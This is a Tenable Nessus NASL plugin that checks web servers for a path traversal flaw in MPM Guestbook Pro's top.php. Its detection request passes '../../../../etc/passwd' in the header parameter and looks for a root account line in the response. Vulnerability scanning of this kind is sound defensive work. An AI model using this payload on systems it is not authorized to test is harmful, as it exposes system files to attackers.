#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
 script_id(16172);
 script_version ("$Revision: 1.5 $");
 script_bugtraq_id(12266);
 script_xref(name:"OSVDB", value:"12892");

 script_name(english:"MPM Guestbook Pro top.php Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is hosting a PHP application that is affected by
an information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running MPM Guestbook, a guestbook application
written in PHP.

There is a flaw in this version which allows an attacker to read
arbitrary files on the remote host or to execute arbitrary PHP 
commands on the remote host by including files hosted on a third-party
server." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?430259a2" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );


script_end_attributes();

 script_summary(english:"Determines MPM Guestbook is installed");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http.inc");
include("global_settings.inc");
include("misc_func.inc");


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);


foreach d (cgi_dirs())
{
 res = http_send_recv3(method:"GET", item:string(d,"/top.php?header=../../../../../../../../etc/passwd"), port:port);
 if (isnull(res)) exit(1, "The remote web server did not respond.");
 if(egrep(pattern:"root:.*:0:[01]:.*", string:res[2]))
 	{
    	security_warning(port);
	exit(0);
	}
}
